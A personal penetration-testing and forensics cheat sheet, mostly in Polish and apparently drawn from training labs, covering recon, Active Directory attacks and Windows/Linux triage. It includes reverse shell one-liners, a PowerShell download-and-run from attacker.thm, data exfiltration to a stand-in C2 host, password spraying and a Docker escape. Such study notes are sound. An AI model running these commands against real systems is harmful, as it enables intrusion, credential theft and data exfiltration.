# Overall
## awk
Wycinanie interesujacej nas tresci z pliku
```
awk -F'[][]' '{print $2}' rpc_wynik.txt > users.txt
```
-F'[][]' — ustawia znaki [ oraz ] jako separatory kolumn.
'{print $2}' — mówi systemowi: "wypisz tylko drugą kolumnę" (czyli to, co znajduje się między pierwszym [, a pierwszym ]).
> users.txt — zapisuje wynik prosto do nowego pliku.
## Nmap
```
nmap --privileged -p- -sV -sC -T4 -v -oN nmap_pelen_skan.txt ip
```
Ktore share z DC daja RW
```
nmap -p445 --script smb-enum-shares IP
```
## Gobuster
```
gobuster dir -u http://10.113.166.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400
```
```
gobuster vhosts -u $4 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -o vhosts_found.txt
```
## Find
```
sudo find / -name ".env.local" -type f 2>/dev/null
```
Bez rozrozniania wielkosci liter
```
find . -iname "*monkey*"
```
## Git
Sprawdzajka dla zmian w plikach
```
git status
```
Dodanie zmian do "koszyka" (Staging)
```
git add nazwa_folderu/plik.md
```
Zatwierdzenie zmian (Commit)
```
git commit -m "Opis zmian"
```
Wypchnięcie na serwer (Push)
```
git push origin main
```
Zassanie z serwera na lokal
```
git pull origin main
```
## Grep
Extended Regular Expression
\ (Wyjscie ze znaku specjalnego) omija znaki akcji.
| (Alternatywa): Szuka jednego lub drugiego wzorca.
``` 
grep -E "Failed|Accepted" /var/log/auth.log
#(znajdzie próby logowania udane i nieudane).
```

\+ (Jeden lub więcej): Dopasowuje co najmniej jedno wystąpienie poprzedniego znaku.
```
grep -E "log+"
#(znajdzie "log", "logg", "loggg").
```
? (Zero lub jedno): Sprawia, że poprzedni znak jest opcjonalny.
``` 
grep -E "https?"
#(znajdzie zarówno "http", jak i "https").
``` 
{n,m} (Kwantyfikatory): Pozwala określić dokładną liczbę powtórzeń.
```
grep -E "[0-9]{1,3}"
#(szuka od jednej do trzech cyfr).
```
\b oznacza samodzielne słowa, tutaj wymusza, żeby znajdował tylko 3literowe.wielo.3literowe
```
grep -Eo "\b[a-z]{3}\.[a-z0-9]+\.[a-z]{3}\b"
```
Linie after
```
grep -A 5 "cos"
```
LInie before
```
grep -B 5 "cos"
```
Linie okalajace
```
grep -C 5 "cos"
```
## Olevba
Wyciąga makro VBA
```
olevba <nazwapliku>
```
## Volatility
Do wyciągania info z zrzutu pamięci RAM
```
vol -f memorydump.raw -h # wyprintuje liste dostepnych modulow
```
## xxd
### Podstawowy podgląd
```
xxd plik.bin
# Wyświetla: Offset | Hex | ASCII
```
### Magic Bytes (Identyfikacja typu pliku)
```
xxd -l 16 plik.bin
# -l [długość]: Wypisuje tylko określoną liczbę bajtów. Pozwala sprawdzić nagłówek (np. ELF, PNG).
```
### Konwersja na czysty Hex (Plain)
```
xxd -p plik.txt
# Wypisuje tylko wartości hex, bez offsetów i ASCII. Przydatne do skryptów.
```
### Zmiana formatowania kolumn
```
xxd -c 8 plik.bin
#-c [liczba]: Określa, ile bajtów ma być w jednej linii (domyślnie 16). Pomaga dopasować widok.
```
### Reverse - odzyskiwanie pliku ze zrzutu
```
xxd -r zrzut_hex.txt > plik_wynikowy.bin
#Zamienia tekstowy zapis hex z powrotem na plik binarny.
```
### Eksport do tablicy C
```
xxd -i plik.bin
#Formatuje zawartość jako zmienną typu char[] (idealne do wrzucania shellcode do exploita).
```
## HashExtender
### https://github.com/iagox86/hash_extender
Jeżeli znamy hash końcowy pliku 1.png, możemy dodać do jego nazwy dodatkowy ciąg znaków, nie zmieniając oryginalnego hasha <signature>
### --data: Specifies the original data to be signed ("1.png").
### --signature: Supplies the original hash signature for "1.png".
### --append: Adds the new data to be appended ("/../4.png").
### --out-data-format=html: Formats the output in HTML to mimic a modified web request.
### --format md5 do zmiany formatu
```
./hash_extender --data 1.png --signature 02d101c0ac898f9e69b7d6ec1f84a7f0d784e59bbbe057acb4cef2cf93621ba9 --append /../4.png --out-data-format=html #SHA256
```
## Notatki
### Detection 1: A Spike of Discovery Commands
```
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel
```
### Detection 2: A Download to Temp Directory
```
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit
```
### Detection 3: Data Exfiltration With SCP
```
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```
# Red
## CrackMapExec
CrackMapExec is a well-known network service exploitation tool that we will use throughout this module. It allows us to perform enumeration, command execution, and post-exploitation attacks in Windows environments. It supports various network protocols, such as SMB, LDAP, RDP, and SSH. If anonymous access is permitted, we can retrieve the password policy without credentials with the following command:
```
crackmapexec smb 10.211.11.10 --pass-pol
```
Password Spray Attack
```
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```
## impacket
### getnpusers
Impacket provides a flexible Python script (GetNPUsers.py) to enumerate accounts in non-Windows environments. To test for the pre-authentication vulnerability, you must supply a users.txt file containing usernames.
```
impacket-GetNPUsers tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```
This command enumerates usernames listed in users.txt and collects AS-REP hashes for vulnerable accounts, saving them in hashes.txt for offline cracking.
## enum4linux-ng
enum4linux-ng is a tool that automates various enumeration techniques against Windows systems, including user enumeration. SMB+RPC protocol.
```
enum4linux-ng -A ip -oA results/scan
# -A: Performs all available enumeration functions (users, groups, shares, password policy, RID cycling, OS information and NetBIOS information).
# -oA: Writes output to YAML and JSON files.
```
## john
ukochany amacz
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
## hashcat
-m trza ustawic na odpowiedni szyfr, np tutaj AS-REP do kerberosa
```
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt 
```

## kerbrute
Kerbrute is a popular enumeration tool used to brute-force and enumerate valid Active Directory users by abusing the Kerberos pre-authentication  
Preferably enumare via enum or manually, create user.txt list and check with kerbrute if these accounts are valid, not disabled, honeypots.
```
kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

## ldapsearch
We can test if anonymous LDAP bind is enabled

```
ldapsearch -x -H ldap://ip -s base
# -x: Simple authentication, in our case, anonymous authentication.
# -H: Specifies the LDAP server.
# -s: Limits the query only to the base object and does not search subtrees or children.
```
User information on dc
```
ldapsearch -x -H ldap://ip -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```
## rpcclient
Microsoft Remote Procedure Call (MSRPC) is a protocol that enables a program running on one computer to request services from a program on another computer thru SMB.
```
rpcclient -U "" ip -N
# -U: Used to specify the username, in our case, we are using an empty string for anonymous login.
# -N: Tells RPC not to prompt us for a password
```
If succesful, we can go through its console.  
500 is the Administrator account, 501 is the Guest account and 512-514 are for the following groups:  Domain Admins, Domain users and Domain guests. User accounts typically start from RID 1000 onwards.
```
for i in $(seq 500 2000); do user=$(echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"); if [ -n "$user" ]; then echo "[RID: $i] $user"; fi; done
```
## SMBCLIENT
You can use it to list, upload, download, and browse files on a remote SMB server.
```
smbclient -L //TARGET_IP -N # an anonymous login withhout password try
```
Connect
```
smbclient //TARGET_IP/SHARE_NAME -N
```
## smbmap (script)
Reconnaissance tool that enumerates SMB shares across a host. It can be used to display read and write permissions for each share.
```
smbmap -H TARGET_IP
```
## SQLMAP
Do edycji zmienne jak nazwa submita, pola username i password
```
sqlmap -u "http://10.114.131.93/login.php" --data="pma_username=admin&pma_password=password&submit=Go" --method POST --level 3 --risk 2 --batch --dbs
```
Dla bardziej opornych serwerow
```
sqlmap -u "http://10.114.131.93/index.php" --data="pma_username=admin&pma_password=password&server=1&target=index.php" --method POST --level 3 --risk 2 --batch --dbs
```
# Red team - WINDOWS
## Privileges
**SeImpersonatePrivilege:** As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.  
**SeAssignPrimaryTokenPrivilege:** This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.  
**SeBackupPrivilege:** This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.  
**SeRestorePrivilege:** This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.  
**SeDebugPrivilege:** This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes.  
```
whoami /all
systeminfo
set
```
## Groups
Domain Admins and Administrators can hold the keys to the whole Active Directory
Enterprise Admins play a key role in a multi-domain forest
Server Operators and Backup Operators are privileged built-in accounts that are worth inspecting
Any group with “Admin” in its name (e.g., “SQL Admins”) could be worth targeting.  
## Registry
After booting, servers and systems are locked until a user manually enters the login credentials. In the case of a misconfigured or testing system, the credentials for auto-logon might be saved.
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```
You might want to check DefaultPassword if saved and AutoAdminLogon if set to 1.
You can search for the value you want using reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v keyword
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```
For installed apps
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```
To search the registry for a specific keyword. For example, to search the registry for password
```
reg query HKLM /f "password" /t REG_SZ /s
```
## Scheduled tasks
You can list/create/run all scheduled tasks using
```
schtasks /query
# /create
# /run
```
## NET
Domain info
```
net help
```
Listing all domain users
```
net user /domain #bez /domain zlistuje lokalne
```
Info about ex user
```
net user <username> /domain
```
Info about domain groups
```
net group /domain
```
We can discover the names of the computers/users on the domain
```
net group <Group Name> / domain
```
Local groups
```
net localgroup
```
Users of local group
```
net localgroup Administrators
```
Logged on users and sessions
```
query user #alias quser
```
RUnning processes
```
tasklist /V
```
SMB Sessions
```
net session
```
## WMIC
Windows services, including the account for each service
```
wmic service get
wmic service get Name,StartName
```
Occasionally, you might find a service with a domain account, DomainName\username. Such domain accounts are worth investigating as they might be reused elsewhere
For powershell equivalent is
```
Get-WmiObject Win32_Service | select Name, StartName
```
## Rubeus - tylko windows
A powerful Windows-based tool designed explicitly for Kerberos-related security testing and enumeration. Rubeus automatically identifies vulnerable accounts and retrieves encrypted AS-REP hashes.
https://github.com/GhostPack/Rubeus
```
Rubeus.exe asreproast
```
## Notatki
### Jeśli masz ograniczony shell i nie możesz przesłać pliku, możesz go "wypluć" jako tekst i skopiować:
```
xxd -p tajny_plik.zip > data.hex
# Na maszynie atakującego:
xxd -r -p data.hex > odzyskany_plik.zip
```
### Docker Escape
** 1. Usługa Dockera na hoście jest sterowana przez REST API które komunikuje się za pomocą pliku gniazda unixowego **
```
ls -la /var/run/docker.sock
```
```
docker #sprawdzamy czy mamy zainstalowanego, jak nie to rzezbimy zadanie API recznie
```
Powinno wyświetlić listę wszystkich kontenerów działających na głównej maszynie
```
docker -H unix:///var/run/docker.sock ps
# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json wersja z recznym api
```
Sprawdzamy jakie sa obrazy
```
docker -H unix:///var/run/docker.sock images
# curl -s -X GET --unix-socket /var/run/docker.sock http://localhost/containers/json
```
Na podstawie znalezionych obrazow, mozemy w naszym kontenerze zamontowac zewnetrznego hosta
```
docker -H unix:///var/run/docker.sock run -it -v /:/mnt/matka --rm php:8.1-cli chroot /mnt/matka bash
#php:8.1-cli to znaleziony obraz, a wiec otwieramy socketa, montujemy u nas w mnt/matka obraz php i otwieramy sobie basha jako root do niego, a --rm usuwa slady
```
Urzadzenia do mounta
```
lsblk #lub fdisk -l
```
Capabilities roota
```
capsh --print
```
### Reverse Shell
```
nc -e /bin/bash <attackbox_ip> <port>
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane
python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'
```
### Interaktywny shell
https://0xffsec.com/handbook/shells/full-tty/
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
CTRL+Z
```
stty raw -echo && fg
```
### Remote payload execution
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.thm/shell.ps1')"
```
# Blue
## Ausearch
```
ausearch -i -x socat # Look for suspicious commands
```
```
ausearch -i --pid 27806 # Find its parent process and build a process tree
```
```
ausearch -i --ppid 27808 | grep proctitle # List all its child processes
```
```
ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
```
## WINDOWS
### Sprawdzenie hash pliku
```
Get-FileHash -Algorithm SHA256 .\file.exe
```
```
certutil -hashfile filename.exe SHA256
```
### Strings Windowsowy
```
Select-String -Path .\file.txt -Pattern "http"
```
```
findstr /i "password" file.txt
```
### Metadata atrybuty
```
Get-Item .\suspicious_file.exe | Select-Object *
```
### Sprawdzenie podpisu
```
Get-AuthenticodeSignature .\installer.exe
```
### Windowsowy grep
```
Select-String
Select-String -Path "C:\Logs\access.log" -Pattern "admin" -CaseSensitive
Get-Process | Select-String "sql" # Sprawdz wszystkie procesy, które mają SQL
```
### Hex
```
Format-Hex .\file.exe | select -first 5
```
### DLL
```
tasklist /m # zrzut wszystkich uzywanych DLL
tasklist /m /fi "IMAGENAME eq notepad.exe" # Sprawdzamy jakie DLL uzywa notepad
tasklist /m /fi "modules eq malicious.dll" # Sprawdzamy w jakich programach jest uzywany dany DLL
```
### CertUtil
#### Dekodowanie b64 pliku
```
certutil -decode
```
#### Encodowanie do b64
```
certutil -encode
```
#### Ściąganie pliku
```
certutil -urlcache -split -f "http://url" C:\Users\Public\payload.exe
```
## Notatki
### Sprawdzenie, czy skrypt nie ukrywa w sobie bajtów wykonywalnych:
```
xxd suspicious_script.sh | head -n 20
```


Przesuń o wyraz do przodu, Alt + F,Forward

Przesuń o wyraz do tyłu, Alt + B,Backward

Przesuń na początek linii, Ctrl + A,A – pierwsza litera alfabetu

Przesuń na koniec linii, Ctrl + E,End 

Usuń wyraz do tyłu, Ctrl + W (lub Alt + Backspace),Word (usuwa słowo w lewo) 

Usuń wyraz do przodu ,Alt + D,Delete (usuwa słowo w prawo) 

Usuń wszystko na lewo, Ctrl + U,Undo (od kursora do początku) 

Usuń wszystko na prawo, Ctrl + K,Kill (od kursora do końca) 

